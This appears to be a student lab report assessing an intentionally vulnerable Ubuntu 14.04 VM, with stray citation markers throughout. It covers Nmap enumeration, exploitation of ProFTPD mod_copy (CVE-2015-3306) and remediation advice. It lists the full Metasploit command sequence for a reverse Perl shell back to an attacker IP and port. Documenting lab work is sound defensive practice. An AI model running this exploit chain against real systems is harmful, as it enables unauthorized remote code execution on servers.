# Vulnerability Assessment Report

## Objective

The objective of this assessment was to run a provided vulnerable VM (Ubuntu 14.04 in an OVA file) in VirtualBox, perform a vulnerability assessment, and exploit identified vulnerabilities to demonstrate the impact. [cite_start]The final deliverable is a report documenting each step and the findings[cite: 7, 167, 171].

---

## Environment Setup

| Component | Detail |
| :--- | :--- |
| **Attacker Machine** | [cite_start]Kali Linux 2025 [cite: 3] |
| **Attacker IP (LHOST)** | [cite_start]10.205.185.43 (used in Metasploit) or 192.168.56.1/102 (example/screenshot) [cite: 4, 38, 145, 153, 170] |
| **Target Machine (Victim)** | [cite_start]Ubuntu 14.04 [cite: 5] |
| **Target IP (RHOST)** | [cite_start]10.205.185.191 (used in Nmap/Metasploit) or 192.168.56.101 (example/screenshot) [cite: 6, 35, 141, 150, 171] |
| **Network Configuration** | [cite_start]Host-Only Network [cite: 14, 168] |
| **Tools Used** | [cite_start]Nmap, Metasploit (msfconsole), Web Browser (Chrome), standard Linux shell commands [cite: 8, 9, 10, 11, 172] |

---

## Enumeration and Discovery

### Service Scan (Nmap)

[cite_start]A service and version enumeration scan was performed on the target machine using Nmap to identify open ports and running services[cite: 17, 18, 175].

**Command Used:**
[cite_start]`nmap -sV -O 10.205.185.191` [cite: 18]

**Key Findings:**

| Port/Service | Version/Detail | Vulnerability/Risk |
| :--- | :--- | :--- |
| **21/tcp (FTP)** | ProFTPD 1.3.5 | [cite_start]**Vulnerable to `mod_copy` RCE (CVE-2015-3306)** [cite: 20, 31, 177] |
| **22/tcp** | SSH | [cite_start]Open [cite: 69] |
| **80/tcp (HTTP)** | Apache 2.4.7 | [cite_start]**Directory listing is enabled** [cite: 21, 98, 176] |
| **445/tcp** | Microsoft-ds (Samba 4.3.11) | [cite_start]MITM risk (Samba) [cite: 22, 74] |
| **3306/tcp**| MySQL | [cite_start]Externally accessible, can be brute-forced for credentials [cite: 23, 78, 90, 185] |
| **8080/tcp**| HTTP-proxy | [cite_start]Open [cite: 79] |

### Web Directory Listing

[cite_start]The web directory listing was analyzed by visiting the target's IP address in a browser to identify accessible files and applications[cite: 24, 25, 26, 176].

**Accessible Directories and Files:**

* [cite_start]`chat/` [cite: 97, 101]
* [cite_start]`drupal/` [cite: 97, 102]
* [cite_start]`payroll_app.php` (1.7K) [cite: 97, 103]
* [cite_start]`phpmyadmin/` [cite: 97, 104]

---

## Exploitation (Remote Code Execution)

[cite_start]The primary exploit vector targeted the identified **ProFTPD 1.3.5** service and its known **`mod_copy` vulnerability (CVE-2015-3306)**, which allows for unauthorized file copy on the server[cite: 29, 31, 177, 183]. [cite_start]This was leveraged to upload and execute a PHP payload, resulting in a reverse shell[cite: 42, 178, 179].

### Metasploit Commands

[cite_start]The `proftpd_modcopy_exec` module was used in Metasploit[cite: 32, 34, 137, 178]:

| Command | Value | Purpose |
| :--- | :--- | :--- |
| `use exploit/unix/ftp/proftpd_modcopy_exec` | | [cite_start]Select the exploit module [cite: 34, 137] |
| `set RHOST 10.205.185.191` | (Victim IP) | [cite_start]Set the target machine IP [cite: 35, 141, 150] |
| `set SITEPATH /var/www/html` | | [cite_start]Set the web-accessible directory for payload upload [cite: 36, 139, 151] |
| `set payload cmd/unix/reverse_perl` | | [cite_start]Select the reverse shell payload [cite: 37, 149, 152] |
| `set LHOST 10.205.185.43` | (Attacker IP) | [cite_start]Set the IP for the reverse TCP handler [cite: 38, 145, 153] |
| `set LPORT 4444` | | [cite_start]Set the port for the reverse TCP handler [cite: 39, 147, 154] |
| `exploit` | | [cite_start]Execute the exploit [cite: 40, 155] |

### Outcome

[cite_start]The exploit successfully uploaded a PHP payload (e.g., `wAdLCeB.php` or `cFalT1.php`) and executed it via HTTP, resulting in a **command shell session** being opened on the attacker machine[cite: 42, 161, 163, 179].

### Post-Exploitation Findings

* [cite_start]**User and Directory:** The attacker gained a shell as the **`www-data`** user [cite: 107, 108, 179] [cite_start]within the web root directory `/var/www/html`[cite: 105, 106].
* [cite_start]**Operating System:** The target is running `Linux ubuntu 3.13.0-24-generic`[cite: 109, 110].
* [cite_start]**Sensitive Applications:** Access was gained to sensitive web applications and directories including: **Drupal, phpMyAdmin, Payroll, and a Chat application**[cite: 88, 89, 180].
* [cite_start]**Chat Application:** The chat could be accessed by typing a random name (e.g., "abin" or "tony") and contained hints[cite: 91, 111, 118, 122].

---

## Findings and Impact Summary

| Severity | Vulnerability | Impact |
| :--- | :--- | :--- |
| **Critical** | [cite_start]ProFTPD 1.3.5 with `mod_copy` enabled (CVE-2015-3306) [cite: 20, 31, 183] | [cite_start]Allowed arbitrary file copy, which was leveraged to upload a web shell and achieve **full Remote Code Execution (RCE)** as the `www-data` user[cite: 93, 183]. [cite_start]An attacker can run arbitrary commands and modify web content[cite: 187, 188]. |
| **High** | [cite_start]Exposed Web Applications (Drupal, phpMyAdmin, payroll app) [cite: 89, 184] | [cite_start]Increased attack surface and risk of data exposure/compromise if these applications contain further vulnerabilities or weak configurations[cite: 184]. |
| **High** | [cite_start]Externally Accessible MySQL (Port 3306) [cite: 23, 78] | [cite_start]Database is reachable over the network and is vulnerable to abuse (e.g., brute-force) if weak credentials are used[cite: 90, 185]. |
| **Medium** | [cite_start]Directory Listing Enabled on HTTP (Apache 2.4.7) [cite: 21] | [cite_start]Revealed application files and directory structure, aiding an attacker in further reconnaissance[cite: 25, 186]. |

---

## Simple Recommendations

[cite_start]The following actions are prioritized to remove the immediate attack vectors and significantly reduce overall risk[cite: 189, 198]:

1.  [cite_start]**Patch or Remove FTP Service:** Immediately **patch or remove the vulnerable ProFTPD** or, at a minimum, **disable the `mod_copy` feature**[cite: 190].
2.  [cite_start]**Restrict Write Access:** **Remove FTP write access to the webroot** (`/var/www/html`); services should not be able to write to publicly accessible directories[cite: 191].
3.  [cite_start]**Harden Web Server:** **Disable directory listing** and restrict access to administrative panels (like `phpMyAdmin` and `Drupal`) using IP restrictions or additional authentication mechanisms[cite: 192].
4.  [cite_start]**Harden Database:** **Restrict MySQL access** to only `localhost` or explicitly trusted hosts, and enforce strong passwords for all database accounts[cite: 193].
5.  [cite_start]**Post-Remediation:** After all fixes are applied, **rotate credentials** for all potentially exposed accounts and scan the system for any remaining backdoors or unauthorized uploads[cite: 194].